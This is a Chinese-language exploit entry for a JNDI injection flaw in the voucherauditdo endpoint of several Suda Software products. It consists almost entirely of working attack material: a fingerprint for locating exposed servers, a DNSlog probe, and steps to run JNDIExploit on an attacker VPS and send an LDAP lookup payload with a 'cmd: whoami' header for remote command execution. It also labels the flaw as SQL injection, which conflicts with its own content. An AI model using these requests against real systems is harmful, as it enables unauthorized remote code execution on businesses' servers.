# 速达软件技术（广州）有限公司多款产品voucherauditdo存在JNID注入漏洞

- **系统**：速达软件技术（广州）有限公司多款产品　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="速达软件技术（广州）有限公司"`
- **请求**：`GET /account/voucher/voucherauditdo!toEdit.action?billId=${jndi:ldap://g58b0k.dnslog.cn} HTTP/1.1`

**请求体 / payload**
```
1. 获取dnslog
g58b0k.dnslog.cn
2. 检测是否存在漏洞
Host:
cmd: whoami
Cookie: JSESSIONID=95B4E05547D0C692CF0D0DD69AC5241B

漏洞利用\
\[JNDIExploit-1.4-SNAPSHOT.jar]\(公众号：渗透安全HackTwo>\
将`JNDIExploit-1.4-SNAPSHOT.jar`上传到`vps`
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i vpsip

GET /account/voucher/voucherauditdo!toEdit.action?billId=${jndi:ldap://vpsip:1389/Basic/TomcatEcho} HTTP/1.1
Host:
cmd: whoami
Cookie: JSESSIONID=95B4E05547D0C692CF0D0DD69AC5241B
```

**其他**
- 速达软件技术（广州）有限公司多款产品voucherauditdo存在JNID注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 速达软件技术（广州）有限公司多款产品